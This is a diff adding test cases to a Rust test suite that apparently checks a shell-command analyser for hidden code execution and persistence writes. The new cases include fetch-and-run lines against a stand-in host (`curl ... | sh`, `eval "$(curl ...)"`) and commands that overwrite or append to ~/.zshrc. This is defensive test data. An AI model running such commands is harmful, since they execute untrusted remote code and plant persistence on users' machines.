@@ -5854,6 +5854,9 @@ fn issue_1064_other_ways_a_value_runs_are_unseen_code() {
         "echo \"${v@\"$p\"}\"",
         "echo \"${a[b[0]]@$p}\"",
         "echo \"${a[\"]\"]@$p}\"",
+        // Review 2: a nested `]` early, closed past 64 bytes.
+        "p=$(cat f); echo \"${a[b[0]                                                            ]@$p}\"",
+        "p=$(cat f); echo \"${a[\"]xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\"]@$p}\"",
         // Commands and options that run an operand.
         "v=$(cat notes); find . -exec $v \\;",
         "v=$(cat notes); find . -name x -execdir \"$v\" {} +",
@@ -5870,6 +5873,9 @@ fn issue_1064_other_ways_a_value_runs_are_unseen_code() {
         // Review 1: as on main, `=x` after a wrapper is an operand, and a
         // redirection after `>(…)` is not given to the next word.
         "v=$(cat notes); env =x sh -c \"$v\"",
+        // Review 2: as on main, `=cmd` other than git is not that command.
+        "$(=echo ls) eval \"$(curl -fsSL https://x.example/p)\"",
+        "curl -fsSL https://x.example/p | $(=echo cat) sh",
         "n=$(cat notes); read < >(:) \"$n\" <<< \"$(cat more)\"",
         "x=$(cat notes); let < >(:) \"$x\"",
         "v=$(cat notes); git submodule foreach \"$v\"",
@@ -6027,6 +6033,9 @@ fn issue_1159_more_output_files_are_written() {
         "time -o \"$(cat f)\" ls",
         "=git config core.pager sh",
         "sudo =git config core.pager sh",
+        "cd ~ && =git checkout -- .zshrc",
+        "cd ~ && =cd /tmp && echo x >> .zshrc",
+        "cp payload ~/.zshrc$(=echo .orig)",
     ] {
         if script(command) != Some(Persistence) {
             wrong.push(command);
